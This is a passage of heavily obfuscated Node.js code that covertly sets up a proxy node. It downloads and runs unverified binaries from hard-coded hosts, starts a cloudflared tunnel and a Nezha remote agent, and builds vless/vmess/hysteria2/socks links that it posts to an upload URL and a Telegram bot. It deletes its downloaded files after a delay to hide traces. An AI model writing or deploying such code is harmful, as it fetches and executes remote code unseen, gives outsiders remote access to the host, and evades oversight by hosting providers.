            _0x4604d0(_0x19779e)
            return
          }
          if (_0xa0f7df + 0x1 < _0x5e9eb9[_0x279e15(0x156)][_0x279e15(0x1e8)]) {
            ;(console['log']('Retrying\x20' + path[_0x279e15(0x15b)](_0x5e9eb9[_0x279e15(0x158)]) + _0x279e15(0x24b)), _0xc2e3c1(_0xa0f7df + 0x1))
            return
          }
          _0xde7ccc(_0x4e398d)
        })
      }
      _0xc2e3c1(0x0)
    })
  })
  try {
    await Promise[_0x57e4a6(0x146)](_0x41825e)
  } catch (_0x1054d8) {
    console[_0x57e4a6(0x1ef)](_0x57e4a6(0x186), _0x1054d8)
    return
  }
  function _0x8f9db2(_0x301f53) {
    const _0x10f210 = _0x57e4a6,
      _0x54d9b9 = 0x1fd
    _0x301f53[_0x10f210(0x237)]((_0x2e257c) => {
      const _0x36a23c = _0x10f210
      if (fs[_0x36a23c(0x201)](_0x2e257c))
        try {
          ;(fs[_0x36a23c(0x1e2)](_0x2e257c, _0x54d9b9),
            console[_0x36a23c(0x189)]('Empowerment\x20success\x20for\x20' + _0x2e257c + ':\x20' + _0x54d9b9[_0x36a23c(0x21d)](0x8)))
        } catch (_0x510ee2) {
          console[_0x36a23c(0x1ef)](_0x36a23c(0x16c) + _0x2e257c + ':\x20' + _0x510ee2)
        }
    })
  }
  const _0x4b3d91 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x8f9db2(_0x4b3d91)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x4b506a = NEZHA_SERVER[_0x57e4a6(0x18c)](':') ? NEZHA_SERVER[_0x57e4a6(0x183)](':')[_0x57e4a6(0x169)]() : '',
        _0x4c20b9 = new Set([_0x57e4a6(0x14c), _0x57e4a6(0x155), _0x57e4a6(0x1fd), '2087', '2083', '2053']),
        _0x2315ca = _0x4c20b9['has'](_0x4b506a) ? _0x57e4a6(0x17b) : _0x57e4a6(0x24d),
        _0x305700 = _0x57e4a6(0x17f) + NEZHA_KEY + _0x57e4a6(0x251) + NEZHA_SERVER + _0x57e4a6(0x207) + _0x2315ca + _0x57e4a6(0x154) + UUID
      fs[_0x57e4a6(0x16a)](path[_0x57e4a6(0x157)](FILE_PATH, _0x57e4a6(0x220)), _0x305700)
      const _0x3deafa = 'nohup\x20' + phpPath + _0x57e4a6(0x181) + FILE_PATH + _0x57e4a6(0x232)
      try {
        ;(await exec(_0x3deafa),
          console[_0x57e4a6(0x189)](phpName + _0x57e4a6(0x21b)),
          await new Promise((_0x1b1992) => setTimeout(_0x1b1992, 0x3e8)))
      } catch (_0x3aa402) {
        console['error'](_0x57e4a6(0x213) + _0x3aa402)
      }
    } else {
      let _0x4ee02a = ''
      const _0x2914f1 = [_0x57e4a6(0x14c), _0x57e4a6(0x155), '2096', _0x57e4a6(0x165), '2083', _0x57e4a6(0x1aa)]
      _0x2914f1[_0x57e4a6(0x18c)](NEZHA_PORT) && (_0x4ee02a = _0x57e4a6(0x23b))
      const _0x1f564f =
        'nohup\x20' + npmPath + _0x57e4a6(0x1d9) + NEZHA_SERVER + ':' + NEZHA_PORT + '\x20-p\x20' + NEZHA_KEY + '\x20' + _0x4ee02a + _0x57e4a6(0x1cc)
      try {
        ;(await exec(_0x1f564f), console['log'](npmName + _0x57e4a6(0x21b)), await new Promise((_0x49065a) => setTimeout(_0x49065a, 0x3e8)))
      } catch (_0x3abf06) {
        console['error'](_0x57e4a6(0x1ab) + _0x3abf06)
      }
    }
  } else console[_0x57e4a6(0x189)](_0x57e4a6(0x1cf))
  const _0x15e4fb = 'nohup\x20' + webPath + _0x57e4a6(0x24c) + FILE_PATH + _0x57e4a6(0x1d5)
  try {
    ;(await exec(_0x15e4fb), console['log'](webName + _0x57e4a6(0x21b)), await new Promise((_0x492f37) => setTimeout(_0x492f37, 0x3e8)))
  } catch (_0x15a0e5) {
    console['error'](_0x57e4a6(0x23a) + _0x15a0e5)
  }
  if (fs[_0x57e4a6(0x201)](botPath)) {
    let _0x591630
    if (ARGO_AUTH[_0x57e4a6(0x22c)](/^[A-Z0-9a-z=]{120,250}$/))
      _0x591630 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH['match'](/TunnelSecret/)
        ? (_0x591630 = _0x57e4a6(0x1d7) + path[_0x57e4a6(0x20c)](FILE_PATH, _0x57e4a6(0x1a9)) + _0x57e4a6(0x1dc))
        : (_0x591630 = _0x57e4a6(0x25a) + path['resolve'](bootLogPath) + _0x57e4a6(0x162) + ARGO_PORT)
    try {
      ;(await exec(_0x57e4a6(0x145) + path['resolve'](botPath) + '\x22\x20' + _0x591630 + _0x57e4a6(0x175)),
        console[_0x57e4a6(0x189)](botName + _0x57e4a6(0x21b)),
        await new Promise((_0x3f112b) => setTimeout(_0x3f112b, 0x7d0)))
    } catch (_0x5ba3c4) {
      console['error']('Error\x20executing\x20command:\x20' + _0x5ba3c4)
    }
  }
  await new Promise((_0x408093) => setTimeout(_0x408093, 0x1388))
}
function getFilesForArchitecture(_0x524c55) {
  const _0xcc7f3a = _0x2a1a64,
    _0x52067e = _0x524c55 === _0xcc7f3a(0x1a3) ? _0xcc7f3a(0x205) : 'https://amd64.oooen.com',
    _0x1b557c = _0x524c55 === _0xcc7f3a(0x1a3) ? 'https://arm64.ssss.nyc.mn' : _0xcc7f3a(0x212),
    _0xc9aaac = [
      { fileName: webPath, fileUrls: [_0x52067e + _0xcc7f3a(0x1a4), _0x1b557c + _0xcc7f3a(0x1a4)] },
      { fileName: botPath, fileUrls: [_0x52067e + _0xcc7f3a(0x215), _0x1b557c + '/bot'] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0xc9aaac[_0xcc7f3a(0x190)]({ fileName: npmPath, fileUrls: [_0x52067e + '/agent', _0x1b557c + _0xcc7f3a(0x260)] })
        : _0xc9aaac[_0xcc7f3a(0x190)]({ fileName: phpPath, fileUrls: [_0x52067e + _0xcc7f3a(0x211), _0x1b557c + '/v1'] })),
    _0xc9aaac
  )
}
function argoType() {
  const _0x1a54ad = _0x2a1a64
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x1a54ad(0x189)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels')
    return
  }
  if (ARGO_AUTH[_0x1a54ad(0x18c)](_0x1a54ad(0x244))) {
    fs['writeFileSync'](path[_0x1a54ad(0x157)](FILE_PATH, _0x1a54ad(0x1bc)), ARGO_AUTH)
    const _0xe36253 =
      '\x0a\x20\x20tunnel:\x20' +
      ARGO_AUTH['split']('\x22')[0xb] +
      '\x0a\x20\x20credentials-file:\x20' +
      path[_0x1a54ad(0x157)](FILE_PATH, _0x1a54ad(0x1bc)) +
      '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
      ARGO_DOMAIN +
      '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:' +
      ARGO_PORT +
      _0x1a54ad(0x170)
    fs[_0x1a54ad(0x16a)](path['join'](FILE_PATH, _0x1a54ad(0x1a9)), _0xe36253)
  } else console[_0x1a54ad(0x189)]('Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20' + ARGO_PORT + _0x1a54ad(0x1ff))
}
async function waitForQuickTunnelLog(_0x39e889 = 0x7530) {
  const _0x1b34ee = _0x2a1a64,
    _0x384886 = Date[_0x1b34ee(0x191)]() + _0x39e889
  while (Date[_0x1b34ee(0x191)]() < _0x384886) {
    try {
      if (fs[_0x1b34ee(0x201)](bootLogPath)) {
        const _0x556e15 = fs[_0x1b34ee(0x21e)](bootLogPath, _0x1b34ee(0x14d))
        if (/trycloudflare\.com/['test'](_0x556e15)) return _0x556e15
      }
    } catch (_0x1466e3) {}
    await new Promise((_0x3dc3f6) => setTimeout(_0x3dc3f6, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x1eaa29 = _0x2a1a64
  let _0x1f388c
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x1f388c = ARGO_DOMAIN), console[_0x1eaa29(0x189)]('ARGO_DOMAIN:', _0x1f388c), await generateLinks(_0x1f388c))
  else
    try {
      const _0x36bde1 = await waitForQuickTunnelLog(),
        _0x5dbbf4 = _0x36bde1['split']('\x0a'),
        _0x4a4ff5 = []
      _0x5dbbf4[_0x1eaa29(0x237)]((_0x31e59c) => {
        const _0x9f0568 = _0x31e59c['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x9f0568) {
          const _0x39577b = _0x9f0568[0x1]
          _0x4a4ff5['push'](_0x39577b)
        }
      })
      if (_0x4a4ff5[_0x1eaa29(0x1e8)] > 0x0)
        ((_0x1f388c = _0x4a4ff5[0x0]), console[_0x1eaa29(0x189)]('ArgoDomain:', _0x1f388c), await generateLinks(_0x1f388c))
      else {
        ;(console[_0x1eaa29(0x189)](_0x1eaa29(0x1c9)), fs[_0x1eaa29(0x226)](path[_0x1eaa29(0x157)](FILE_PATH, _0x1eaa29(0x1c5))))
        async function _0x59daa8() {
          const _0x3d542a = _0x1eaa29
          try {
            process['platform'] === _0x3d542a(0x22e)
              ? await exec(_0x3d542a(0x1b7) + botName + _0x3d542a(0x150))
              : await exec(_0x3d542a(0x21f) + botName['charAt'](0x0) + ']' + botName[_0x3d542a(0x24f)](0x1) + _0x3d542a(0x194))
          } catch (_0x501cce) {}
        }
        ;(_0x59daa8(), await new Promise((_0x5e5a63) => setTimeout(_0x5e5a63, 0xbb8)))
        const _0x527e13 = _0x1eaa29(0x25a) + path[_0x1eaa29(0x20c)](bootLogPath) + _0x1eaa29(0x162) + ARGO_PORT
        try {
          ;(await exec(_0x1eaa29(0x145) + path[_0x1eaa29(0x20c)](botPath) + '\x22\x20' + _0x527e13 + _0x1eaa29(0x175)),
            console[_0x1eaa29(0x189)](botName + _0x1eaa29(0x21b)),
            await new Promise((_0x4e1119) => setTimeout(_0x4e1119, 0x1770)),
            await extractDomains())
        } catch (_0x3f5550) {
          console['error'](_0x1eaa29(0x234) + _0x3f5550)
        }
      }
    } catch (_0x4bc6ad) {
      console['error'](_0x1eaa29(0x1f1), _0x4bc6ad)
    }
}
async function getMetaInfo() {
  const _0x132a6a = _0x2a1a64
  try {
    const _0x93e2af = await axios['get'](_0x132a6a(0x20e), { headers: { 'User-Agent': _0x132a6a(0x250), timeout: 0xbb8 } })
    if (_0x93e2af['data'] && _0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1c1)] && _0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1dd)])
      return (_0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1c1)] + '-' + _0x93e2af[_0x132a6a(0x1ca)][_0x132a6a(0x1dd)])[_0x132a6a(0x173)](/\s+/g, '_')
  } catch (_0x1c2dff) {
    try {
      const _0x6f8709 = await axios[_0x132a6a(0x209)](_0x132a6a(0x159), { headers: { 'User-Agent': _0x132a6a(0x250), timeout: 0xbb8 } })
      if (
        _0x6f8709[_0x132a6a(0x1ca)] &&
        _0x6f8709[_0x132a6a(0x1ca)][_0x132a6a(0x262)] === _0x132a6a(0x221) &&
        _0x6f8709[_0x132a6a(0x1ca)]['countryCode'] &&
        _0x6f8709[_0x132a6a(0x1ca)]['org']
      )
        return (_0x6f8709[_0x132a6a(0x1ca)][_0x132a6a(0x18e)] + '-' + _0x6f8709[_0x132a6a(0x1ca)][_0x132a6a(0x16b)])[_0x132a6a(0x173)](/\s+/g, '_')
    } catch (_0x54b3a5) {}
  }
  return _0x132a6a(0x23d)
}
async function getServerIP() {
  const _0x8834c8 = _0x2a1a64
  let _0x457882 = ''
  try {
    const _0x39cb15 = await axios[_0x8834c8(0x209)](_0x8834c8(0x1b4), { timeout: 0xbb8 })
    _0x457882 = _0x39cb15[_0x8834c8(0x1ca)]['trim']()
  } catch (_0xf435a3) {
    try {
      _0x457882 = execSync(_0x8834c8(0x253))[_0x8834c8(0x21d)]()['trim']()
    } catch (_0x5d9da5) {
      try {
        const _0x2a5c62 = await axios['get'](_0x8834c8(0x1e1), { timeout: 0xbb8 })
        _0x457882 = '[' + _0x2a5c62[_0x8834c8(0x1ca)]['trim']() + ']'
      } catch (_0x34f96c) {
        try {
          _0x457882 = '[' + execSync('curl\x20-sm\x203\x20ipv6.ip.sb')[_0x8834c8(0x21d)]()[_0x8834c8(0x240)]() + ']'
        } catch (_0x4f55b3) {
          console['error'](_0x8834c8(0x184), _0x4f55b3[_0x8834c8(0x222)])
        }
      }
    }
  }
  return _0x457882
}
async function generateLinks(_0x4e4a53) {
  const _0x100275 = await getMetaInfo(),
    _0x491774 = NAME ? NAME + '-' + _0x100275 : _0x100275,
    _0x5073a2 = await getServerIP()
  return new Promise((_0x3f1e38) => {
    setTimeout(() => {
      const _0x7a612 = _0x4856,
        _0x39de67 = {
          v: '2',
          ps: '' + _0x491774,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x7a612(0x15c),
          net: 'ws',
          type: _0x7a612(0x21c),
          host: _0x4e4a53,
          path: _0x7a612(0x1c6),
          tls: _0x7a612(0x179),
          sni: _0x4e4a53,
          alpn: '',
          fp: 'firefox'
        }
      let _0x43ace5 =
        _0x7a612(0x25e) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?encryption=none&security=tls&sni=' +
        _0x4e4a53 +
        '&fp=firefox&type=ws&host=' +
        _0x4e4a53 +
        '&path=%2Fvless-argo%3Fed%3D2560#' +
        _0x491774 +
        '\x0a\x0avmess://' +
        Buffer['from'](JSON[_0x7a612(0x217)](_0x39de67))[_0x7a612(0x21d)](_0x7a612(0x23e)) +
        _0x7a612(0x22b) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x7a612(0x1e6) +
        _0x4e4a53 +
        '&fp=firefox&type=ws&host=' +
        _0x4e4a53 +
        _0x7a612(0x19e) +
        _0x491774 +
        _0x7a612(0x167)
      if (isValidPort(HY2_PORT)) {
        const _0x485e06 = getCertificateFingerprint(certPath),
          _0x200559 = _0x485e06 ? _0x7a612(0x1f0) + encodeURIComponent(_0x485e06) : '',
          _0x4b85df = '\x0ahysteria2://' + UUID + '@' + _0x5073a2 + ':' + HY2_PORT + _0x7a612(0x1ed) + _0x200559 + '#' + _0x491774
        _0x43ace5 += _0x4b85df
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x210147 =
          _0x7a612(0x25e) +
          UUID +
          '@' +
          _0x5073a2 +
          ':' +
          REALITY_PORT +
          '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=' +
          publicKey +
          '&type=tcp&headerType=none#' +
          _0x491774
        _0x43ace5 += _0x210147
      }
      if (isValidPort(S5_PORT)) {
        const _0x49bdbb = Buffer[_0x7a612(0x163)](UUID[_0x7a612(0x24f)](0x0, 0x8) + ':' + UUID[_0x7a612(0x1e4)](-0xc))[_0x7a612(0x21d)](
            _0x7a612(0x23e)
          ),
          _0x5c3dd8 = _0x7a612(0x1e3) + _0x49bdbb + '@' + _0x5073a2 + ':' + S5_PORT + '#' + _0x491774
        _0x43ace5 += _0x5c3dd8
      }
      ;(console['log'](Buffer[_0x7a612(0x163)](_0x43ace5)['toString'](_0x7a612(0x23e))),
        fs[_0x7a612(0x16a)](subPath, Buffer[_0x7a612(0x163)](_0x43ace5)[_0x7a612(0x21d)](_0x7a612(0x23e))),
        fs['writeFileSync'](listPath, _0x43ace5, _0x7a612(0x168)),
        console['log'](FILE_PATH + _0x7a612(0x17c)),
        (subContent = Buffer[_0x7a612(0x163)](_0x43ace5)[_0x7a612(0x21d)](_0x7a612(0x23e))),
        uploadNodes(),
        _0x3f1e38(_0x43ace5))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x3f6838 = _0x2a1a64
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x1fa5e7 = PROJECT_URL + '/' + SUB_PATH,
      _0x2ca427 = { subscription: [_0x1fa5e7] }
    try {
      const _0x6a5cd6 = await axios[_0x3f6838(0x1b6)](UPLOAD_URL + _0x3f6838(0x15f), _0x2ca427, { headers: { 'Content-Type': _0x3f6838(0x242) } })
      return _0x6a5cd6 && _0x6a5cd6['status'] === 0xc8 ? (console['log']('Subscription\x20uploaded\x20successfully'), _0x6a5cd6) : null
    } catch (_0x4c5d8a) {
      if (_0x4c5d8a[_0x3f6838(0x24a)]) {
        if (_0x4c5d8a[_0x3f6838(0x24a)][_0x3f6838(0x262)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0x3f6838(0x201)](listPath)) return
      const _0x29ceef = fs['readFileSync'](listPath, 'utf-8'),
        _0x2be027 = _0x29ceef[_0x3f6838(0x183)]('\x0a')[_0x3f6838(0x1ba)]((_0x5b3ce9) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x5b3ce9)
        )
      if (_0x2be027[_0x3f6838(0x1e8)] === 0x0) return
      const _0x52ff5a = JSON[_0x3f6838(0x217)]({ nodes: _0x2be027 })
      try {
        const _0x21dba1 = await axios[_0x3f6838(0x1b6)](UPLOAD_URL + _0x3f6838(0x1b2), _0x52ff5a, { headers: { 'Content-Type': 'application/json' } })
        return _0x21dba1 && _0x21dba1[_0x3f6838(0x262)] === 0xc8 ? (console[_0x3f6838(0x189)](_0x3f6838(0x1f6)), _0x21dba1) : null
      } catch (_0x470e4f) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  setTimeout(() => {
    const _0x559d46 = _0x4856,
      _0x1e3e3e = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x1e3e3e[_0x559d46(0x1a0)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x1e3e3e[_0x559d46(0x1a0)](phpPath)
    process['platform'] === 'win32'
      ? exec(_0x559d46(0x18b) + _0x1e3e3e['join']('\x20') + _0x559d46(0x1d3), (_0x191dc0) => {
          const _0x2ecb75 = _0x559d46
          ;(console[_0x2ecb75(0x24e)](), alwaysLog('App\x20is\x20running'), console[_0x2ecb75(0x189)](_0x2ecb75(0x19d)))
        })
      : exec('rm\x20-rf\x20' + _0x1e3e3e[_0x559d46(0x157)]('\x20') + _0x559d46(0x198), (_0x5f37a5) => {
          const _0x2e0eec = _0x559d46
          ;(console[_0x2e0eec(0x24e)](), alwaysLog(_0x2e0eec(0x248)), console[_0x2e0eec(0x189)](_0x2e0eec(0x19d)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0xafdb36 = _0x2a1a64
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0xafdb36(0x189)](_0xafdb36(0x1e7))
    return
  }
  try {
    const _0x131fd8 = fs[_0xafdb36(0x21e)](subPath, _0xafdb36(0x168)),
      _0xe0face = 'https://api.telegram.org/bot' + BOT_TOKEN + _0xafdb36(0x1eb),
      _0x564b97 = NAME['replace'](/[_*\[\]()~`>#+=|{}.!-]/g, '\x5c$&'),
      _0x4b251d = { chat_id: CHAT_ID, text: '**' + _0x564b97 + _0xafdb36(0x1ee) + _0x131fd8 + '```', parse_mode: _0xafdb36(0x1c3) }
    ;(await axios['post'](_0xe0face, null, { params: _0x4b251d }), console[_0xafdb36(0x189)](_0xafdb36(0x227)))
  } catch (_0xefc2cd) {
    console[_0xafdb36(0x1ef)]('Failed\x20to\x20send\x20Telegram\x20message:', _0xefc2cd[_0xafdb36(0x222)])
  }
}
async function AddVisitTask() {
  const _0x1007c5 = _0x2a1a64
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console[_0x1007c5(0x189)](_0x1007c5(0x199))
    return
  }
  try {
    const _0x1f83ba = await axios['post'](_0x1007c5(0x151), { url: PROJECT_URL }, { headers: { 'Content-Type': 'application/json' } })
    return (console[_0x1007c5(0x189)](_0x1007c5(0x1c0)), _0x1f83ba)
  } catch (_0x582a73) {
    return (console['error'](_0x1007c5(0x174) + _0x582a73[_0x1007c5(0x222)]), null)
  }
}
async function startserver() {
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x175c1f) {
    console['error']('Error\x20in\x20startserver:', _0x175c1f)
  }
}
startserver()[_0x2a1a64(0x17d)]((_0x202b94) => {
  const _0x5a01ba = _0x2a1a64
  console[_0x5a01ba(0x1ef)](_0x5a01ba(0x252), _0x202b94)
})
const server = http['createServer'](async (_0x52a14d, _0x4d2084) => {
  const _0x51cb4e = _0x2a1a64,
    _0x38b7e0 = _0x52a14d[_0x51cb4e(0x14f)][_0x51cb4e(0x183)]('?')[0x0]
  if (_0x38b7e0 === '/' + SUB_PATH) {
    if (subContent) (_0x4d2084['writeHead'](0xc8, { 'Content-Type': _0x51cb4e(0x1d8) }), _0x4d2084[_0x51cb4e(0x1c2)](subContent))
    else
      try {
        const _0x59d1e0 = fs[_0x51cb4e(0x21e)](subPath, 'utf-8')
        ;(_0x4d2084[_0x51cb4e(0x1d6)](0xc8, { 'Content-Type': _0x51cb4e(0x1d8) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x59d1e0))
      } catch (_0x43b3ac) {
        ;(_0x4d2084[_0x51cb4e(0x1d6)](0x1f7, { 'Content-Type': _0x51cb4e(0x1d8) }),
          _0x4d2084[_0x51cb4e(0x1c2)]('Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.'))
      }
    return
  }
  if (_0x38b7e0 === '/') {
    try {
      const _0x1623d2 = path['join'](__dirname, _0x51cb4e(0x1bf)),
        _0x54e723 = await fs['promises'][_0x51cb4e(0x25c)](_0x1623d2, 'utf8')
      ;(_0x4d2084[_0x51cb4e(0x1d6)](0xc8, { 'Content-Type': _0x51cb4e(0x19a) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x54e723))
    } catch (_0xe18231) {
      ;(_0x4d2084[_0x51cb4e(0x1d6)](0xc8, { 'Content-Type': _0x51cb4e(0x19a) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x51cb4e(0x22a)))
    }
    return
  }
  ;(_0x4d2084[_0x51cb4e(0x1d6)](0x194, { 'Content-Type': _0x51cb4e(0x1d8) }), _0x4d2084[_0x51cb4e(0x1c2)](_0x51cb4e(0x225)))
})
server['listen'](PORT, () => alwaysLog(_0x2a1a64(0x1c7) + PORT + '!'))
